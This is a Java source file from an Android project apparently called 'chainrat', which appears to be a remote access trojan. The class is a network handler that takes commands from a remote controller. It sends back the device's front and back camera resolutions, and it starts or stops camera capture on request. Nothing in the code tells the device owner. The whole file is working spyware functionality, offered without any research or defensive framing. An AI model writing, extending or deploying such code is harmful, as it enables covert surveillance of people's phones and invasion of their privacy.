package com.nefi.chainrat.networking.CommandHandler;

import android.graphics.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.util.Log;
import android.util.Size;
import com.nefi.chainrat.MainActivity;
import com.nefi.chainrat.MainService;
import com.nefi.chainrat.networking.CommandType;
import com.nefi.chainrat.networking.packets.CameraRequest;
import com.nefi.chainrat.networking.packets.CameraResponse;
import com.nefi.chainrat.networking.packets.Packet;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;

public class CameraRequestHandler extends ChannelInboundHandlerAdapter {
    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        Log.d("net22work", "CameraRequestHandler");
        Packet packet = (Packet) msg;
        Log.d("net22work", packet.content);
        if(packet.type == CommandType.CAMERA_REQUEST){
            CameraRequest request = (CameraRequest) MainService.deserialize(packet.content, CameraRequest.class);
            try {
                if(request.stop){
                    //user wants to stop
                    MainService.getPictureService().stopCapturing();
                    return;
                }else if(request.height == 0 && request.width == 0){
                    //user wants to request specs
                    String frontID = MainService.getPictureService().getIDByLensFacing(CameraCharacteristics.LENS_FACING_FRONT);
                    String backID = MainService.getPictureService().getIDByLensFacing(CameraCharacteristics.LENS_FACING_BACK);

                    //Get supported dimensions
                    Size[] frontDimensions = MainService.getPictureService().getCameraSizes(frontID);
                    Size[] backDimensions = MainService.getPictureService().getCameraSizes(backID);

                    //Convert sizes to int arrays because java size and android size are different
                    int[] frontWidth = new int[frontDimensions.length];
                    int[] frontHeight = new int[frontDimensions.length];
                    int[] backWidth = new int[backDimensions.length];
                    int[] backHeight = new int[backDimensions.length];

                    int i = 0;
                    for (Size sizeFront : frontDimensions){
                        frontWidth[i] = sizeFront.getWidth();
                        frontHeight[i] = sizeFront.getHeight();
                        i++;
                    }
                    i = 0;
                    for (Size sizeBack : backDimensions){
                        backWidth[i] = sizeBack.getWidth();
                        backHeight[i] = sizeBack.getHeight();
                        i++;
                    }

                    CameraResponse cr = new CameraResponse(frontWidth, frontHeight, backWidth, backHeight);
                    Log.d("net22work", "CameraResponse: " + MainService.serialize(cr, CameraResponse.class));
                    Packet out = new Packet(CommandType.CAMERA_RESPONSE, MainService.serialize(cr, CameraResponse.class));
                    Log.d("net22work", "Response Packet: " + MainService.serialize(out, Packet.class));
                    ctx.channel().writeAndFlush(out);
                    return;
                } else {
                    //user wants us to start streaming#
                    //set camera ID to front or back
                    int facing = request.useFront ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK; //if useFront is true use LENS_FACING_FRONT else use LENS_FACING_BACK
                    String cameraID = MainService.getPictureService().getIDByLensFacing(facing);
                    Size dimensions = new Size(request.width, request.height);
                    MainService.getPictureService().startCapturing(MainService.getInstance(), cameraID, dimensions);
                    return;
                }
            }catch (Exception e){
                e.printStackTrace();
            }
            return;
        }
        ctx.fireChannelRead(msg);
    }
}
